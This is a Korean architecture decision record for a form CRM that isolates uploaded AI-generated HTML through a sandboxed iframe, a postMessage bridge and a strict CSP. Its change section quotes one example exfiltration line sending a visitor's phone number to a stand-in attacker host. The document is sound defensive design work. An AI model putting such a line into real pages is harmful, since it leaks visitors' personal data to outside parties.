# 0002. HTML 격리

- 상태: 승인
- 날짜: 2026-10-23

## 맥락

운영자는 AI로 만든 단일 HTML 파일을 올리고, 그 HTML이 공개 폼 화면이 된다(ADR 0004). 이 HTML은 운영자가 직접 쓰지 않았고 인라인 스크립트·스타일·외부 이미지·폰트를 자유롭게 담는다. 업로드 HTML이 악의적이거나 실수로 위험한 코드를 담아도 다음은 지켜야 한다.

- 관리자 자격 증명(refresh 쿠키, 메모리의 access token)과 관리자 API에 닿지 못한다.
- 방문자의 입력을 운영자가 모르는 외부 주소로 보내지 못한다.
- 신청 제출은 서버가 정한 경로·형식으로만 나간다(동의 확인, 필드 검증).

AI가 만든 HTML은 스크립트로 입력 마스킹·단계 전환 같은 동작을 하는 경우가 많아, 스크립트를 지우면 폼이 깨진다.

## 결정

**샌드박스 iframe + postMessage**
- 공개 폼 페이지 `/f/{slug}`는 서버가 값을 끼워 넣지 않는 고정 셸이다. 래퍼 스크립트(`/f/_assets/form-wrapper.js`, React와 분리된 vanilla JS)가 `location.pathname`에서 slug를 읽고 `/api/public/forms/{slug}`로 제목·동의 문구·필드 설정·HTML 원문을 받는다. 제목·동의 문구는 `textContent`로만 넣는다.
- 업로드 HTML은 `<iframe sandbox="allow-scripts allow-forms" srcdoc>`로만 렌더링한다. `allow-same-origin`은 금지다. iframe 문서는 불투명 출처(`origin === "null"`)라 래퍼 페이지의 DOM·쿠키·저장소를 읽지 못하고, 같은 출처 요청도 쿠키 없이 나간다. `allow-top-navigation`, `allow-popups`도 주지 않는다.
- 래퍼는 HTML의 `</body>` 앞(없으면 끝)에 브리지 스크립트를 붙인다. 브리지는 form `submit`을 막고 `FormData`를 `{name: value | value[]}`로 모아 `parent.postMessage({type: "lm:submit", fields}, "*")`로 넘긴다. iframe 높이도 `lm:resize`로 알린다.
- 래퍼는 `event.source === iframe.contentWindow`, `event.origin === "null"`, 알려진 `type`인 메시지만 받는다. 브리지도 업로드 HTML과 같은 문서에 있어 조작될 수 있으므로, 래퍼가 필드 이름이 fieldConfig에 있는지와 필수 값을 다시 확인하고, 래퍼 자신의 동의 체크박스가 체크되어 있어야 `POST /api/public/forms/{slug}/submissions`(`{fields, consent: true, lm}`)로 보낸다. 결과는 래퍼 영역에 표시하고 iframe에 `{type: "lm:result", ok}`로 돌려준다. 서버도 같은 검증을 다시 한다(이슈 #8).

**CSP와 보안 헤더 (public 포트의 모든 응답)**

```
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self'; frame-src 'self'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: DENY
```

- `srcdoc` 문서는 부모 문서의 CSP를 상속한다. 업로드 HTML의 인라인 스크립트·스타일과 브리지 스크립트가 돌려면 `'unsafe-inline'`이 필요하다. 셸 페이지에는 서버가 신뢰할 수 없는 값을 섞지 않으므로(모든 동적 값은 JS의 `textContent`·`srcdoc` 속성으로만 들어간다) 셸 자체에 대한 인라인 주입 경로가 없다.
- `connect-src 'self'`로 fetch·XHR·WebSocket·beacon의 외부 전송을, `form-action 'none'`으로 네이티브 폼 제출을 막는다. 업로드 HTML이 외부로 입력을 보내려 해도 브라우저가 차단한다. 이미지·폰트·스타일은 AI가 만든 HTML이 CDN을 쓰는 경우가 많아 `https:`를 허용한다.
- `frame-ancestors 'none'`과 `X-Frame-Options: DENY`로 공개 폼을 다른 사이트에 끼워 넣지 못하게 한다(클릭재킹). `base-uri 'none'`으로 `<base>` 주입을 막는다.
- 헤더는 서블릿 필터(`PublicSecurityHeadersFilter`)가 붙여 래퍼 셸, 정적 스크립트, 공개 API, 404·410 안내 페이지, OriginGuard의 404까지 모두 덮는다. 예외로, 인코딩된 `/`(`%2F`)처럼 Tomcat 커넥터가 애플리케이션 필터에 넘기기 전에 거부하는 400 응답에는 CSP가 없다. 이 응답은 본문이 Tomcat 기본 오류 페이지뿐이고 업로드 HTML이나 래퍼 스크립트를 담지 않아 막을 실행 컨텍스트가 없으므로 받아들인다.

**스크립트를 지우지 않는다**
- 업로드 시 스크립트를 제거하거나 HTML을 소독하지 않는다. 격리는 브라우저의 출처 경계(sandbox)와 CSP가 맡는다. 소독은 우회 사례가 계속 나오는 블랙리스트 방식이고, 스크립트에 기대는 AI 생성 폼을 깨뜨린다.

**404·410**
- `/f/{slug}`는 브라우저 페이지라 없는 slug·draft는 404, closed는 410(“마감된 신청입니다”) 정적 HTML 안내로 답한다. `/api/public/**`는 ProblemDetail JSON이다.

## 고려한 대안

| 대안 | 장점 | 단점 | 채택하지 않은 이유 |
|---|---|---|---|
| 업로드 HTML을 공개 페이지에 직접 렌더링 | 단순, 높이 조절 불필요 | 업로드 스크립트가 래퍼와 같은 출처에서 돈다 | 격리가 없다 |
| sandbox에 `allow-same-origin` 추가 | iframe 높이·DOM 접근이 쉽다 | `allow-scripts`와 함께면 iframe이 sandbox를 스스로 풀 수 있다 | 격리가 무의미해진다 |
| 스크립트 제거·HTML 소독(jsoup Safelist 등) | CSP를 엄격하게(`'unsafe-inline'` 없이) 둘 수 있다 | 우회 위험, 스크립트에 기대는 폼이 깨진다 | 브라우저 경계가 더 확실하고 폼 동작을 보존한다 |
| 업로드 HTML을 별도 도메인에서 제공 | 출처 분리가 가장 강하다 | 로컬 `docker compose` 하나로 재현하기 어렵다 | 과제 범위에서는 sandbox 불투명 출처로 충분하다. 운영 시 공개 출처를 별도 호스트로 두는 것은 ADR 0010 |
| CSP nonce·hash로 인라인 허용 | `'unsafe-inline'` 없이 셸 보호 | srcdoc이 CSP를 상속해 업로드 HTML의 인라인 코드가 막힌다 | 업로드 HTML마다 hash를 계산해도 이벤트 핸들러 속성은 막힌다 |

## 결과

- 업로드 HTML은 관리자 출처·래퍼의 쿠키와 DOM에 닿지 못하고 외부로 데이터를 보내지 못한다. 제출은 래퍼 검증과 서버 검증을 모두 거친다.
- `'unsafe-inline'`이 있으므로 셸 페이지에 서버 측 동적 값을 섞기 시작하면 XSS 경로가 생긴다. 셸은 정적 문자열로 유지한다.
- 업로드 HTML의 외부 스크립트(`<script src="https://...">`)는 `script-src 'self'`로 막힌다. AI 생성 HTML이 외부 스크립트를 쓰면 그 부분은 동작하지 않는다. 필요해지면 허용 목록을 새 ADR로 정한다.
- iframe 높이는 브리지의 `lm:resize`로 맞춘다. 브라우저 동작(제출 흐름, 높이)은 이후 Playwright E2E로 검증한다.

## 변경

### 2026-10-23: 이미지·스타일·폰트의 외부 `https:` 허용 제거

CSP를 다음으로 바꾼다. `style-src`, `img-src`, `font-src`에서 `https:`를 뺐고 나머지는 그대로다.

```
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; frame-src 'self'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'
```

- 이유: `connect-src 'self'`와 `form-action 'none'`만으로는 외부 전송을 다 막지 못한다. 업로드 HTML의 스크립트는 방문자 입력을 GET URL에 담아 `new Image().src = "https://evil.example/?phone=..."`, 동적 `<link rel=stylesheet>`, `@font-face` 같은 경로로 보낼 수 있다. 이 CRM은 전화번호·이메일 같은 개인정보를 받으므로, 맥락에서 정한 "방문자의 입력을 운영자가 모르는 외부 주소로 보내지 못한다"를 지키려면 이 경로도 닫아야 한다.
- 대가: AI가 만든 HTML이 CDN 이미지, 외부 스타일시트(Tailwind CDN 등), 웹폰트(Google Fonts 등)를 쓰면 그 리소스는 불러오지 못한다. 이미지는 빈 자리나 `alt`로, 폰트는 시스템 폰트로, 외부 CSS는 스타일 없이 보인다. 인라인 `<style>`과 `data:` 이미지·폰트는 계속 동작하므로 폼 자체는 쓸 수 있다.
- 후속: 템플릿 점검 추가 기능(이슈 #16)이 업로드 시 외부 리소스 참조를 찾아 운영자에게 경고한다. 운영자는 그 경고를 보고 리소스를 인라인으로 바꿔 다시 올릴 수 있다.
- 위 "결정"의 "이미지·폰트·스타일은 ... `https:`를 허용한다"는 이 변경으로 대체된다.
